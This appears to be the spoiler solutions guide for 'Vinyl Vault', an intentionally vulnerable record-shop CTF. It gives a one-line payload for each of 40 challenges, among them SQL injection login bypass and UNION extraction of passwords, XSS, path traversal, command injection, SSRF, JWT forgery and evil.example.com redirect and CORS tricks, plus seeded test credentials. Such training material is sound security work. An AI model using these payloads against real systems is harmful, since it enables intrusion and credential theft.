# Vinyl Vault - Operator / Solutions Guide

**SPOILER WARNING.** This file lists every challenge and how to solve it. Keep it
away from players.

There are **40 challenges** in **4 difficulty tiers of 10**, worth more points the
harder they get:

| Tier | Points each | Count | Subtotal |
|------|-------------|-------|----------|
| Easy | 10 | 10 | 100 |
| Medium | 25 | 10 | 250 |
| Hard | 40 | 10 | 400 |
| Insane | 60 | 10 | 600 |
| **Total** | | **40** | **1350** |

The first hint of every challenge is free; later hints cost points (more per tier).
Solves are per team and only count once. Where noted "(simulated)", the app
recognises the exploit technique and awards points without executing anything
dangerous (no real shell, outbound request, entity expansion, or catastrophic
regex).


## EASY - 10 pts each (10)

| # | Challenge | id | Technique / solution | Endpoint(s) |
|---|-----------|----|----------------------|-------------|
| 1 | Left the Lights On | `debug-config-exposed` | Left-in debug endpoint dumps env/secrets. | `GET /api/debug/config` |
| 2 | Staff Only | `broken-access-control-header` | Server trusts a client-set role header. | `GET /api/admin/users -H "X-User-Role: admin"` |
| 3 | Someone Else's Mail | `idor-order` | No ownership check on order id. | `GET /api/orders/{otherId}` |
| 4 | Know Thy Neighbour | `idor-user-record` | User lookup returns full record incl. secret answer + hash. | `GET /api/users/{otherId}` |
| 5 | A Very Good Deal | `coupon-negative-total` | Discount never clamped -> total goes negative. | `POST /api/checkout/apply-coupon {total:1,code:"BLACKFRIDAY"}` |
| 6 | Echo Chamber | `reflected-xss-search` | Query echoed into the SPA verbatim. | `GET /api/products/search?q=<img src=x onerror=1>` |
| 7 | Nothing to See Here | `forced-browsing-robots` | Unlinked path disclosed by robots.txt. | `Read /robots.txt -> GET /api/staff-lounge` |
| 8 | Out of the Box | `default-credentials` | Shipped support account, default password. | `POST /api/login support@vinylvault.test / changeme` |
| 9 | Name Your Price | `price-tampering` | Server trusts client-sent unit price. | `POST /api/orders items[].price below catalogue` |
| 10 | Less Than Nothing | `negative-quantity` | Negative quantity yields negative total. | `POST /api/orders items[].qty < 0` |

## MEDIUM - 25 pts each (10)

| # | Challenge | id | Technique / solution | Endpoint(s) |
|---|-----------|----|----------------------|-------------|
| 1 | Off the Shelf | `sqli-search-internal-product` | Search concatenates q; reveals genre=Misc internal items. | `GET /api/products/search?q=%' OR '1'='1` |
| 2 | The Backdoor Key | `sqli-login-bypass` | Email field concatenated into auth query. | `POST /api/login email=' OR role='admin' --` |
| 3 | Leave a Note | `stored-xss-review` | Review rendered as-is to all viewers. | `POST /api/products/{id}/reviews body:<img onerror=...>` |
| 4 | Fresh Start, Big Title | `mass-assignment-register-admin` | Register accepts unlisted role field. | `POST /api/register {..., role:"admin"}` |
| 5 | Promotion | `mass-assignment-profile-admin` | Profile update trusts role field. | `PUT /api/me {role:"admin"}` |
| 6 | Reading Between the Folders | `path-traversal-download` | No path sanitisation on download. | `GET /api/download?file=../server.js` |
| 7 | Say Cheese | `insecure-upload-active-content` | Arbitrary file accepted and served from /uploads/. | `POST /api/upload (JSON) {filename:"evil.html",content:"<script>.."}` |
| 8 | Sort It Out | `order-by-injection` | sort concatenated into ORDER BY. | `GET /api/catalog?sort=(CASE WHEN 1=1 THEN id END)` |
| 9 | Paper Trail | `idor-invoice` | Invoice fetched by id with no ownership check. | `GET /api/invoices/{otherOrderId}` |
| 10 | Follow the Sign | `open-redirect` | Redirect target taken from user param. | `GET /api/go?url=https://evil.example.com` |

## HARD - 40 pts each (10)

| # | Challenge | id | Technique / solution | Endpoint(s) |
|---|-----------|----|----------------------|-------------|
| 1 | Forgot Something? | `weak-password-reset` | Reset relies on a leakable security answer. | `Leak answer via /api/users/{id}, then POST /api/reset/confirm` |
| 2 | Guess the Signature | `jwt-weak-secret-forge` | Weak, committed JWT secret. | `Sign HS256 token with committed secret, role admin -> GET /api/admin/ledger` |
| 3 | Twenty Questions | `blind-sqli-user-enum` | Boolean yes/no is injectable. | `GET /api/check-email?email=x' OR '1'='1` |
| 4 | Phone Home | `ssrf-cover-art` | Server fetches attacker URL (internal). | `POST /api/products/{id}/cover {url:"http://127.0.0.1:9090/"}` |
| 5 | Poisoned Well | `prototype-pollution` | Unsafe recursive merge. | `POST /api/preferences {"__proto__":{"polluted":"yes"}}` |
| 6 | Stack the Deck | `coupon-stacking` | Multiple coupons stack past 100%. | `POST /api/checkout/apply-coupons {total,codes:[...]}` |
| 7 | Now Playing | `command-injection` | Shell metacharacters unfiltered (simulated). | `GET /api/tools/ping?host=8.8.8.8;id` |
| 8 | Sleeper Agent | `second-order-sqli` | Stored value later used unsafely. | `PUT /api/me display_name with SQL, then GET /api/admin/audit` |
| 9 | Spreadsheet Surprise | `csv-formula-injection` | Exported CSV cell becomes a live spreadsheet formula. | `Order with address starting = , then GET /api/account/export.csv` |
| 10 | Bring Your Own Identity | `insecure-deserialization-cookie` | Encoded prefs blob decoded and trusted. | `GET /api/preferences/whoami?prefs=base64({role:"admin"})` |

## INSANE - 60 pts each (10)

| # | Challenge | id | Technique / solution | Endpoint(s) |
|---|-----------|----|----------------------|-------------|
| 1 | Sign Here | `jwt-alg-none` | alg:none accepted. | `Token header alg:none, role admin -> GET /api/admin/stats` |
| 2 | Fill in the Blanks | `ssti` | Template expression evaluated server-side. | `POST /api/orders/{id}/message {template:"{{7*7}}"}` |
| 3 | Old School | `xxe` | External entities recognised (simulated). | `POST /api/import XML with DOCTYPE/ENTITY` |
| 4 | Deep Cut | `sqli-union-users` | UNION exfiltration from users. | `GET /api/products/search?q=%' UNION SELECT email,password FROM users--` |
| 5 | Trust Issues | `jwt-unverified-endpoint` | Signature never verified (decode only). | `Token with garbage signature, role admin -> GET /api/premium/lounge` |
| 6 | The Vault | `admin-flag-captured` | Requires genuine privilege escalation. | `Become a REAL db admin, then GET /api/admin/vault` |
| 7 | Return to Sender | `host-header-injection` | Reset link trusts the forwarded host header. | `POST /api/reset/link -H "X-Forwarded-Host: evil.example.com"` |
| 8 | Catastrophe | `redos` | Catastrophic-backtracking pattern (simulated). | `GET /api/validate/handle?h=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!` |
| 9 | Open House | `cors-credential-theft` | Reflects any origin + allows credentials. | `GET /api/account/secret -H "X-Test-Origin: https://evil.example.com"` |
| 10 | Key Confusion | `jwt-kid-injection` | kid used in an injectable key lookup. | `Token header kid="1' OR '1'='1" -> GET /api/reports` |

---

## Seeded shop accounts

| Email | Password | Role | Notes |
|-------|----------|------|-------|
| admin@vinylvault.test | Vinyl!Admin2019 | admin | main admin |
| support@vinylvault.test | changeme | admin | default-credentials backdoor |
| dj.mole@vinylvault.test | spinspin | user | security answer: `Groovy` (reset target) |
| ripley@vinylvault.test | nostromo | user | |

Order #3 is an internal admin order that leaks "Master key code: 4471".

## Teams

No teams are seeded. Players log in / create a team at the gate before playing.
The team/scoring endpoints are CTF infrastructure and are deliberately NOT part
of the challenge attack surface.
